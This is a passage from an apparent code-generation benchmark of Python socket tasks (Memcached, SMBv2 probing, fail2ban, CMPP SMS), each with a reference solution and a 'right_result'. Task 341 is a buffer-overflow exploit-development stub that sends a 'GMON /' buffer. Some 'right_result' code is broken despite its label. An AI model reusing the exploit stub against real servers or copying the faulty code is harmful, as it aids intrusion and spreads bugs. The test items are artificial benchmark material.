       self._process_packets()\n            except socket.error:\n                self._relaunch_adb_bridge()\n\n    def _process_packets(self) -> None:\n        while len(self.packet_buffer) >= 8:\n            packet_length = struct.unpack('>I', self.packet_buffer[0:4])[0]\n            if len(self.packet_buffer) < packet_length + 8:\n                break\n            packet_type = struct.unpack('>I', self.packet_buffer[4:8])[0]\n            payload = self.packet_buffer[8:packet_length + 8]\n            self.packet_buffer = self.packet_buffer[packet_length + 8:]\n            self._handle_packet(packet_type, payload)\n\n    def _handle_packet(self, packet_type: int, payload: bytes) -> None:\n        pass\n\n    def dispose(self, disposing: bool = True) -> None:\n        if self._disposed:\n            return\n        self._disposed = True\n        if disposing:\n            self.socket.close()\n            if self.adb_proc:\n                self.adb_proc.terminate()\n                self.adb_proc.wait()"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from a Memcached server using TCP socket communication.\n\nClass Description: The MemcachedCollector class is designed to connect to a Memcached server, retrieve its statistics, and parse them into a structured dictionary format. It handles both IPv4 and Unix domain socket connections.\n\nAttributes:\n\nGAUGES: [list] - A list of metric names that should be treated as gauge values (values that can increase or decrease)\n\nMethods:\n\nget_raw_stats: [Name](host, port) -> [str] - Establishes a TCP connection to the specified Memcached server (either via IP:port or Unix socket), sends the 'stats' command, and returns the raw response data as a string. Handles connection errors gracefully.\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [str] - Raw statistics data in Memcached protocol format\n\nget_stats: [Name](host, port) -> [dict] - Retrieves and processes statistics from the Memcached server, returning them as a dictionary with metric names as keys and numeric values (either int or float).\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [dict] - Processed statistics with metric names as keys and numeric values",
    "Canonical_solution": "import socket\nimport re\n\nclass MemcachedCollector:\n    GAUGES = [\n        'bytes',\n        'connection_structures',\n        'curr_connections',\n        'curr_items',\n        'threads',\n        'reserved_fds',\n        'limit_maxbytes',\n        'hash_power_level',\n        'hash_bytes',\n        'hash_is_expanding',\n        'uptime'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            sock.settimeout(3)\n            sock.send('stats\\n')\n\n            while True:\n                received = sock.recv(4096)\n                if not received:\n                    break\n                data += received\n                if data.endswith('END\\r\\n'):\n                    break\n        except socket.error:\n            pass\n        finally:\n            sock.close()\n        return data\n\n    def get_stats(self, host, port):\n        ignored = ('libevent', 'pointer_size', 'time', 'version',\n                   'repcached_version', 'replication', 'accepting_conns',\n                   'pid')\n        stats = {}\n        data = self.get_raw_stats(host, port)\n\n        for line in data.splitlines():\n            pieces = line.split(' ')\n            if pieces[0] != 'STAT' or pieces[1] in ignored:\n                continue\n            if '.' in pieces[2]:\n                stats[pieces[1]] = float(pieces[2])\n            else:\n                stats[pieces[1]] = int(pieces[2])\n\n        return stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport re\n\nclass MemcachedCollector:\n    GAUGES = ['bytes', 'curr_items', 'curr_connections', 'uptime']\n\n    def get_raw_stats(self, host, port):\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n            \n            sock.sendall(b'stats\\r\\n')\n            data = b''\n            while True:\n                chunk = sock.recv(4096)\n                if not chunk:\n                    break\n                data += chunk\n                if b'END\\r\\n' in data:\n                    break\n            sock.close()\n            return data.decode('utf-8')\n        except Exception as e:\n            return \"\"\n\n    def get_stats(self, host, port):\n        raw_data = self.get_raw_stats(host, port)\n        if not raw_data:\n            return {}\n\n        stats = {}\n        lines = raw_data.strip().split('\\r\\n')\n        \n        for line in lines:\n            if line.startswith('STAT '):\n                _, key, value = line.split(' ', 2)\n                try:\n                    num_value = float(value)\n                    if num_value.is_integer():\n                        num_value = int(num_value)\n                    stats[key] = num_value\n                except ValueError:\n                    continue\n        return stats"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, sends a payload, and then closes the connection. It handles the socket creation, connection, data transmission, and cleanup.\n\nInput:\n- target_ip: str - The IP address of the target server\n- target_port: int - The port number of the target server\n- payload: str - The data to be sent to the server\n\nOutput: None (The function does not return any value but sends the payload to the server)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip: str, target_port: int, payload: str):\n    \"\"\"\n    Sends a TCP payload to a target server\n    \n    Args:\n        target_ip: IP address of target server\n        target_port: Port number of target server\n        payload: Data to send to server\n    \"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    s.send(payload.encode())\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        sock.connect((target_ip, target_port))\n        sock.sendall(payload.encode())\n    finally:\n        sock.close()"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host, sends an SMB2 negotiation packet, and processes the server's response to determine SMBv2 support and potential vulnerabilities.\n\nFunction Description: The function connects to a target host using TCP, constructs and sends an SMB2 negotiation packet, then analyzes the response to check for SMBv2 support and potential vulnerabilities. The function handles socket operations including connection, timeout setting, data sending/receiving, and proper connection closure.\n\nInput:\n- host: tuple - A tuple containing (IP_address: str, port: int) representing the target server's address and port\n\nOutput:\n- None (prints messages to console about SMBv2 support and potential vulnerabilities)\n- Raises exceptions for connection or communication errors\n\nThe function performs the following key operations:\n1. Creates a TCP/IPv4 socket\n2. Connects to the specified host with a 5-second timeout\n3. Constructs SMB2 negotiation packet with appropriate headers\n4. Sends the packet prefixed with its length\n5. Receives and analyzes the server response\n6. Determines SMBv2 support from the response\n7. Checks for potential vulnerabilities if SMBv2 is supported\n8. Closes the connection properly in all cases",
    "Canonical_solution": "import sys\nimport os\nimport datetime\nimport struct\nimport socket\n\nsys.path.insert(0, os.path.realpath(os.path.join(os.path.dirname(__file__), '..')))\nfrom packets import SMB2Header, SMB2Nego, SMB2NegoData\n\ndef run(host):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(host)  \n    s.settimeout(5) \n\n    Header = SMB2Header(Cmd=\"\\x72\",Flag1=\"\\x18\",Flag2=\"\\x53\\xc8\")\n    Nego = SMB2Nego(Data = SMB2NegoData())\n    Nego.calculate()\n\n    Packet = str(Header)+str(Nego)\n    Buffer = struct.pack(\">i\", len(Packet)) + Packet\n    s.send(Buffer)\n\n    try:\n        data = s.recv(1024)\n        if data[4:5] == \"\\xff\":\n           print \"This host doesn't support SMBv2\" \n        if data[4:5] == \"\\xfe\":\n           IsDCVuln(GetBootTime(data[116:124]))\n    except Exception:\n        s.close()\n        raise",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef check_smbv2_vulnerabilities(host):\n    IP_ADDRESS, PORT = host\n    NEGOTIATE_PROTOCOL_CMD = b'\\x00\\x00\\x00\\x81\\x00\\x00\\x00\\x00\\x00\\x7f\\xff\\xff\\x02\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)\n        sock.connect((IP_ADDRESS, PORT))\n        sock.send(b'\\x00\\x00\\x00' + bytes([len(NEGOTIATE_PROTOCOL_CMD)]) + NEGOTIATE_PROTOCOL_CMD)\n        response = sock.recv(1024)\n        if len(response) > 64 and b'SMB' in response[4:8]:\n            smb_version = response[4:8]\n            if smb_version == b'\\xfeSMB':\n                print(\"SMBv2 is supported by the server.\")\n                dialects_offset = int.from_bytes(response[40:42], byteorder='little')\n                dialect_count = int.from_bytes(response[42:44], byteorder='little')\n                dialects = []\n                offset = dialects_offset\n                for _ in range(dialect_count):\n                    dialect_length = int.from_bytes(response[offset:offset+2], byteorder='little')\n                    dialect = response[offset+2:offset+2+dialect_length].decode('utf-8', errors='ignore')\n                    dialects.append(dialect)\n                    offset += 2 + dialect_length\n                vulnerable_dialects = ['SMB2.002', 'SMB2.???']\n                if any(d in dialects for d in vulnerable_dialects):\n                    print(\"Potential vulnerability detected: Server supports outdated SMB dialects.\")\n                else:\n                    print(\"No known vulnerabilities found in supported SMB dialects.\")\n            else:\n                print(\"Server does not support SMBv2.\")\n        else:\n            print(\"Invalid or unexpected SMB response received.\")\n    except (socket.timeout, ConnectionRefusedError, OSError) as e:\n        raise Exception(f\"Connection or communication error: {e}\")\n    finally:\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n            sock.close()\n        except:\n            pass"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Create a Python class that implements TCP client functionality for testing server connections and sending data to a server.\n\nClass Description: The TargetSocket class provides TCP client capabilities to check server availability and send data to a specified port on localhost. It handles connection establishment, data transmission, and proper resource cleanup.\n\nAttributes:\n- sock: [socket.socket] - The socket object used for TCP communication (initially None)\n- targetPort: [int] - The target port number for server communication (default: 5001)\n\nMethods:\n- testServerConnectionTcp() -> [bool] - Tests if a connection can be established with the target server. Returns True if successful, False otherwise.\n- sendToSocket(data: str) -> [bool] - Attempts to send the provided string data to the target server. Makes up to 10 connection attempts with 100ms delays between attempts. Returns True if data was sent successfully, False otherwise.",
    "Canonical_solution": "import socket\n\nclass TargetSocket:\n    def __init__(self, target_port=5001):\n        self.sock = None\n        self.targetPort = target_port\n\n    def testServerConnectionTcp(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = ('localhost', self.targetPort)\n\n        try:\n            sock.connect(server_address)\n        except socket.error as exc:\n            return False\n\n        sock.close()\n        return True\n\n    def sendToSocket(self, data):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n\n        host = 'localhost'\n        port = self.targetPort\n\n        isOpen = False\n        n = 0\n        while isOpen is False:\n            try:\n                s.connect((host, port))\n                isOpen = True\n            except Exception as e:\n                time.sleep(0.1)\n                n += 1\n                isOpen = False\n\n            if n == 10:\n                return False\n\n        try:\n            s.send(str.encode(data))\n        except Exception as e:\n            print(\"B: \" + str(e))\n\n        s.close()\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\n\nclass TargetSocket:\n    def __init__(self, targetPort=5001):\n        self.sock = None\n        self.targetPort = targetPort\n\n    def testServerConnectionTcp(self) -> bool:\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.settimeout(1)\n            self.sock.connect((\"localhost\", self.targetPort))\n            self.sock.settimeout(None)\n            return True\n        except (socket.timeout, ConnectionRefusedError):\n            return False\n        finally:\n            if self.sock:\n                self.sock.close()\n                self.sock = None\n\n    def sendToSocket(self, data: str) -> bool:\n        for _ in range(10):\n            try:\n                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.sock.connect((\"localhost\", self.targetPort))\n                self.sock.sendall(data.encode())\n                return True\n            except (socket.timeout, ConnectionRefusedError):\n                self.sock = None\n                time.sleep(0.1)\n            finally:\n                if self.sock:\n                    self.sock.close()\n                    self.sock = None\n        return False"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Python class for handling Unix domain socket communication with a server, including sending and receiving serialized data, timeout management, and proper connection cleanup.\n\nClass Description: CSocket is a class that manages communication over a Unix domain socket. It handles socket creation, connection, data serialization/deserialization, timeout settings, and proper connection termination. The class uses pickle for object serialization and implements custom protocol handling with CSPROTO constants.\n\nAttributes:\n- __csock: [socket.socket] - The underlying Unix domain socket object\n- __deftout: [float] - The default timeout value for socket operations\n\nMethods:\n- __init__(sock: str, timeout: int = -1) -> None - Initializes the socket connection to the specified Unix domain socket path with optional timeout\n- __del__() -> None - Destructor that ensures proper socket cleanup\n- send(msg: Any, nonblocking: bool = False, timeout: Optional[float] = None) -> Any - Serializes and sends data to the server, then waits for and returns the response\n- settimeout(timeout: float) -> None - Sets the socket timeout (use -1 for default)\n- close() -> None - Properly closes the socket connection with protocol-compliant shutdown\n- convert(m: Any) -> Union[str, bool, int, float, list, dict, set] - Static method to convert objects to serializable types\n- receive(sock: socket.socket, nonblocking: bool = False, timeout: Optional[float] = None) -> Any - Static method to receive and deserialize data from the socket",
    "Canonical_solution": "import socket\nfrom pickle import dumps, loads, HIGHEST_PROTOCOL\nfrom ..protocol import CSPROTO\n\nclass CSocket:\n    def __init__(self, sock=\"/var/run/fail2ban/fail2ban.sock\", timeout=-1):\n        self.__csock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.__deftout = self.__csock.gettimeout()\n        if timeout != -1:\n            self.settimeout(timeout)\n        self.__csock.connect(sock)\n\n    def __del__(self):\n        self.close()\n    \n    def send(self, msg, nonblocking=False, timeout=None):\n        obj = dumps(list(map(CSocket.convert, msg)), HIGHEST_PROTOCOL)\n        self.__csock.send(obj)\n        self.__csock.send(CSPROTO.END)\n        return self.receive(self.__csock, nonblocking, timeout)\n\n    def settimeout(self, timeout):\n        self.__csock.settimeout(timeout if timeout != -1 else self.__deftout)\n\n    def close(self):\n        if not self.__csock:\n            return\n        try:\n            self.__csock.sendall(CSPROTO.CLOSE + CSPROTO.END)\n            self.__csock.shutdown(socket.SHUT_RDWR)\n        except socket.error:\n            pass\n        try:\n            self.__csock.close()\n        except socket.error:\n            pass\n        self.__csock = None\n    \n    @staticmethod\n    def convert(m):\n        if isinstance(m, (str, bool, int, float, list, dict, set)):\n            return m\n        else:\n            return str(m)\n\n    @staticmethod\n    def receive(sock, nonblocking=False, timeout=None):\n        msg = CSPROTO.EMPTY\n        if nonblocking: sock.setblocking(0)\n        if timeout: sock.settimeout(timeout)\n        bufsize = 1024\n        while msg.rfind(CSPROTO.END, -32) == -1:\n            chunk = sock.recv(bufsize)\n            if not len(chunk):\n                raise socket.error(104, 'Connection reset by peer')\n            if chunk == CSPROTO.END: break\n            msg = msg + chunk\n            if bufsize < 32768: bufsize <<= 1\n        return loads(msg)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport pickle\nimport os\nfrom typing import Any, Optional, Union\n\nclass CSPROTO:\n    MSGLEN_BYTES = 4\n\nclass CSocket:\n    __csock: socket.socket\n    __deftout: float\n\n    def __init__(self, sock: str, timeout: int = -1) -> None:\n        self.__csock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        if timeout != -1:\n            self.__deftout = timeout\n            self.__csock.settimeout(timeout)\n        self.__csock.connect(sock)\n\n    def __del__(self) -> None:\n        self.close()\n\n    def send(self, msg: Any, nonblocking: bool = False, timeout: Optional[float] = None) -> Any:\n        serialized = pickle.dumps(CSocket.convert(msg))\n        self.__csock.sendall(len(serialized).to_bytes(CSPROTO.MSGLEN_BYTES, byteorder='big') + serialized)\n        \n        if nonblocking:\n            return None\n        \n        return CSocket.receive(self.__csock, nonblocking, timeout)\n\n    def settimeout(self, timeout: float) -> None:\n        self.__deftout = timeout if timeout != -1 else self.__deftout\n        self.__csock.settimeout(self.__deftout)\n\n    def close(self) -> None:\n        try:\n            self.__csock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        finally:\n            self.__csock.close()\n\n    @staticmethod\n    def convert(m: Any) -> Union[str, bool, int, float, list, dict, set]:\n        return m\n\n    @staticmethod\n    def receive(sock: socket.socket, nonblocking: bool = False, timeout: Optional[float] = None) -> Any:\n        if nonblocking and timeout is not None:\n            sock.settimeout(timeout)\n        \n        try:\n            msg_len = int.from_bytes(sock.recv(CSPROTO.MSGLEN_BYTES), byteorder='big')\n            data = sock.recv(msg_len)\n            return pickle.loads(data)\n        except socket.timeout:\n            return None\n        finally:\n            if nonblocking and timeout is not None:\n                sock.settimeout(None)"
  },
  {
    "Task_id": 341,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error messages, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        initial_data = s.recv(1024)\n        if initial_data:\n            print(f\"Received initial data: {initial_data.decode('utf-8', errors='ignore')}\")\n        prefixed_buffer = f\"GMON /{buffer}\".encode()\n        s.sendall(prefixed_buffer)\n        print(\"Buffer sent successfully.\")\n    except socket.error as e:\n        print(f\"Connection error: {e}\")\n    finally:\n        try:\n            s.close()\n        except:\n            pass"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a message, and continuously receives responses from the server.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a predefined or custom message, and enters a loop to continuously receive and print responses from the server until manually interrupted. The connection is closed after the loop exits (though in practice, the loop is infinite and `s.close()` may not be reached).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the target server. Defaults to \"localhost\".\n- `port` (int, optional): The port number of the target server. Defaults to 5001.\n- `message` (bytes, optional): The message to send to the server. Defaults to a predefined GPS tracker message in bytes format.\n\nOutput: None (The function prints received data to the console but does not return any value).",
    "Canonical_solution": "import socket\nimport binascii\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"imei:123456789012345,tracker,151030080103,,F,000101.000,A,5443.3834,N,02512.9071,E,0.00,0;\"):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    \n    while True:\n        print(s.recv(1024))\n    \n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"$GPRMC,123456.00,A,3723.2475,N,12158.3416,W,0.0,360.0,120419,,,A*73\"):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.sendall(message)\n    try:\n        while True:\n            data = s.recv(1024)\n            if not data:\n                break\n            print(\"Received:\", data.decode('utf-8', errors='replace'))\n    except KeyboardInterrupt:\n        pass\n    finally:\n        s.close()"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Implement a CMPP (China Mobile Peer-to-Peer) client class in Python that handles communication with a CMPP gateway server for sending SMS messages. The class should manage TCP socket connections, authentication, message sending, and response handling.\n\nClass Description: The CMPPClient class encapsulates the functionality to connect to a CMPP gateway server, authenticate using SP credentials, send SMS messages, and handle server responses. It maintains socket connections and sequence numbering for message tracking.\n\nAttributes:\n- ip: str - The IP address of the CMPP gateway server\n- port: int - The port number of the CMPP gateway server\n- sp_id: str - The service provider ID for authentication\n- sp_secret: str - The service provider secret for authentication\n- src_id: str - The source ID for SMS messages\n- service_id: str - The service ID for SMS messages\n- _sequence_id: int - Internal counter for message sequence numbers\n- _is_connect: bool - Connection status flag\n- _times: int - Number of connection retry attempts\n- __socket: socket.socket - The TCP socket object for server communication\n\nMethods:\n- __init__(host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str) -> None - Initializes the client with server details and credentials\n- sequence_id() -> int - Property that returns and increments the sequence ID\n- _connect() -> None - Establishes TCP connection to the server with retry logic\n- send(instance: Union[CMPPBaseRequestInstance, bytes]) -> None - Sends a CMPP request or raw message to the server\n- recv() -> tuple - Receives and parses a response from the server\n- close() -> None - Closes the connection and sends termination request\n- _cmpp_connect() -> None - Handles CMPP authentication protocol\n- _cmpp_send_sms(dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None - Internal method for sending SMS messages\n- send_sms(dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None - Public method for sending SMS with error handling",
    "Canonical_solution": "import socket\nimport struct\nimport time\nfrom typing import List, Dict\n\nclass CMPPClient:\n    def __init__(self, host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str):\n        self.ip = host\n        self.port = port\n        self.sp_id = sp_id\n        self.sp_secret = sp_secret\n        self.src_id = src_id\n        self.service_id = service_id\n        self._sequence_id = 0\n        self._is_connect = False\n        self._times = 3\n        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._connect()\n\n    @property\n    def sequence_id(self) -> int:\n        s = self._sequence_id\n        self._sequence_id += 1\n        return s\n\n    def _connect(self) -> None:\n        self.__socket.settimeout(5)\n        for i in range(self._times):\n            try:\n                self.__socket.connect((self.ip, self.port))\n                self._is_connect = True\n                break\n            except Exception as err:\n                time.sleep(1)\n        else:\n            raise Exception('Failed to connect to the CMPP gateway server')\n\n    def send(self, instance) -> None:\n        if isinstance(instance, CMPPBaseRequestInstance):\n            message = instance.get_message(sequence_id=self.sequence_id)\n        else:\n            message = instance\n        self.__socket.send(message)\n\n    def recv(self) -> tuple:\n        raw_length = self.__socket.recv(4)\n        length, = struct.unpack('!L', raw_length)\n        header, body = CMPPResponseInstance().parse(\n            raw_length + self.__socket.recv(length - 4)\n        )\n        return header, body\n\n    def close(self) -> None:\n        if self._is_connect:\n            terminate_request = CMPPTerminateRequestInstance()\n            self.send(terminate_request)\n            self.__socket.close()\n\n    def _cmpp_connect(self) -> None:\n        connect_request = CMPPConnectRequestInstance(self.sp_id, self.sp_secret)\n        self.send(connect_request)\n        header, body = self.recv()\n        if body['Status'] != 0:\n            raise Exception('CMPPv2.0 authentication failed')\n\n    def _cmpp_send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        message = template_param.get('message')\n        if message is None:\n            code = template_param.get('code')\n            message = template_code.replace('{code}', code)\n        msg = '\u3010%s\u3011 %s' % (sign_name, message)\n        submit_request = CMPPSubmitRequestInstance(\n            msg_src=self.sp_id, src_id=self.src_id, msg_content=msg,\n            dest_usr_tl=len(dest), dest_terminal_id=dest,\n            service_id=self.service_id\n        )\n        self.send(submit_request)\n        header, body = self.recv()\n        command_id = header.get('command_id')\n        if command_id == CMPP_DELIVER:\n            deliver_request = CMPPDeliverRespRequestInstance(\n                msg_id=body['Msg_Id'], result=body['Result']\n            )\n            self.send(deliver_request)\n\n    def send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        try:\n            self._cmpp_connect()\n            self._cmpp_send_sms(dest, sign_name, template_code, template_param)\n        except Exception as e:\n            self.close()\n            raise Exception(e)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\nimport struct\nfrom typing import List, Dict, Tuple, Union\n\nclass CMPPBaseRequestInstance:\n    def __init__(self):\n        self.header = b''\n        self.body = b''\n\nclass CMPPClient:\n    MAX_RETRY_TIMES = 3\n    CONNECT_TIMEOUT = 10\n    RECV_BUFFER_SIZE = 1024 * 1024\n\n    def __init__(self, host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str) -> None:\n        self.ip = host\n        self.port = port\n        self.sp_id = sp_id\n        self.sp_secret = sp_secret\n        self.src_id = src_id\n        self.service_id = service_id\n        self._sequence_id = 0x10000001\n        self._is_connect = False\n        self._times = 0\n        self.__socket = None\n\n    @property\n    def sequence_id(self) -> int:\n        seq = self._sequence_id\n        self._sequence_id += 1\n        return seq\n\n    def _connect(self) -> None:\n        retry_count = 0\n        while retry_count < self.MAX_RETRY_TIMES:\n            try:\n                self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.__socket.settimeout(self.CONNECT_TIMEOUT)\n                self.__socket.connect((self.ip, self.port))\n                self._is_connect = True\n                self._times = 0\n                return\n            except (socket.timeout, ConnectionRefusedError) as e:\n                retry_count += 1\n                if retry_count >= self.MAX_RETRY_TIMES:\n                    raise ConnectionError(f\"Connection failed after {self.MAX_RETRY_TIMES} attempts: {str(e)}\")\n                time.sleep(2)\n\n    def send(self, instance: Union[CMPPBaseRequestInstance, bytes]) -> None:\n        if not self._is_connect:\n            self._connect()\n        \n        if isinstance(instance, CMPPBaseRequestInstance):\n            message = instance.header + instance.body\n        else:\n            message = instance\n            \n        try:\n            self.__socket.sendall(message)\n        except (socket.error, ConnectionResetError):\n            self._times += 1\n            if self._times < self.MAX_RETRY_TIMES:\n                self._connect()\n                self.__socket.sendall(message)\n            else:\n                raise\n\n    def recv(self) -> tuple:\n        try:\n            header_data = self.__socket.recv(12)\n            if not header_data:\n                return (None, None)\n                \n            total_length, command_id, sequence_id = struct.unpack('!III', header_data)\n            \n            remaining = total_length - 12\n            body_data = b''\n            while remaining > 0:\n                data = self.__socket.recv(min(remaining, self.RECV_BUFFER_SIZE))\n                if not data:\n                    break\n                body_data += data\n                remaining -= len(data)\n                \n            return (command_id, sequence_id, body_data)\n        except socket.error:\n            return (None, None, None)\n\n    def close(self) -> None:\n        if self.__socket and self._is_connect:\n            try:\n                termination_packet = struct.pack('!III', 12, 0x80000004, self.sequence_id)\n                self.__socket.sendall(termination_packet)\n                self.__socket.shutdown(socket.SHUT_RDWR)\n            except socket.error:\n                pass\n            finally:\n                self.__socket.close()\n                self._is_connect = False\n\n    def _cmpp_connect(self) -> None:\n        timestamp = int(time.time()) % 1000000\n        auth_source = self.sp_id.encode() + b'\\x00' * 9 + self.sp_secret.encode() + struct.pack('!I', timestamp)\n        \n        connect_body = struct.pack(\n            '!21sIBBHI',\n            self.sp_id.encode(),\n            timestamp,\n            0x10,  # version\n            0x04,  # user_count\n            len(self.sp_secret),\n            timestamp\n        )\n        \n        header = struct.pack('!III', 12 + len(connect_body), 0x00000001, self.sequence_id)\n        request = CMPPBaseRequestInstance()\n        request.header = header\n        request.body = connect_body\n        \n        self.send(request)\n        \n        response = self.recv()\n        if response[0] != 0x80000001 or len(response[2]) < 4:\n            raise ConnectionError(\"CMPP authentication failed\")\n\n    def _cmpp_send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        registered_delivery = 1\n        msg_type = 0x03\n        sender_len = 21\n        sender_phone = b'\\x00' * 21\n        dest_user_cnt = len(dest)\n        \n        msg_content = json.dumps({\n            \"sign\": sign_name,\n            \"template\": template_code,\n            \"params\": template_param\n        }).encode()\n        \n        sms_body = struct.pack(\n            '!BBH21sB%dsIHB%dsB%ds' % (len(msg_content), len(self.src_id), len(dest[0])),\n            registered_delivery,\n            msg_type,\n            sender_len,\n            sender_phone,\n            len(msg_content),\n            msg_content,\n            self.service_id,\n            dest_user_cnt,\n            dest[0].encode()\n        )\n        \n        header = struct.pack('!III', 12 + len(sms_body), 0x00000004, self.sequence_id)\n        request = CMPPBaseRequestInstance()\n        request.header = header\n        request.body = sms_body\n        \n        self.send(request)\n\n    def send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        try:\n            if not self._is_connect:\n                self._cmpp_connect()\n                \n            self._cmpp_send_sms(dest, sign_name, template_code, template_param)\n            \n            response = self.recv()\n            if response[0] != 0x80000004 or len(response[2]) < 4:\n                status = struct.unpack('!I', response[2][:4])[0]\n                if status != 0:\n                    raise Exception(f\"SMS sending failed with status code: {status}\")\n        except Exception as e:\n            if self._times < self.MAX_RETRY_TIMES:\n                self._times += 1\n                self.send_sms(dest, sign_name, template_code, template_param)\n            else:\n                raise RuntimeError(f\"Failed to send SMS after retries: {str(e)}\")"
  },
  {
    "Task_id": 346,
